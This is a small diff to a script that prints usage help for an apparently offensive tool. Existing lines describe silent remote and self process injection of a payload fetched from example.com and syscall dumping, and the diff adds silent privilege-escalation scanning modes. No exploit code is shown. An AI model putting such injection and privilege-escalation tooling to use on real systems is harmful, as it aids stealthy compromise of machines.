@@ -94,4 +94,6 @@ echo "  ./$EXE_NAME -debug -example                                       # Self
 echo "  ./$EXE_NAME -url http://example.com/payload.bin                   # Remote injection (silent)"
 echo "  ./$EXE_NAME -url http://example.com/payload.bin -self             # Self injection (silent)"
 echo "  ./$EXE_NAME -dump                                                 # Dump syscalls (silent)"
-echo "  ./$EXE_NAME -debug -dump                                          # Dump syscalls with debug output" 
+echo "  ./$EXE_NAME -privesc                                              # Scan privilege escalation vectors (silent)"
+echo "  ./$EXE_NAME -debug -dump                                          # Dump syscalls with debug output"
+echo "  ./$EXE_NAME -debug -privesc                                       # Scan privesc vectors with debug output" 
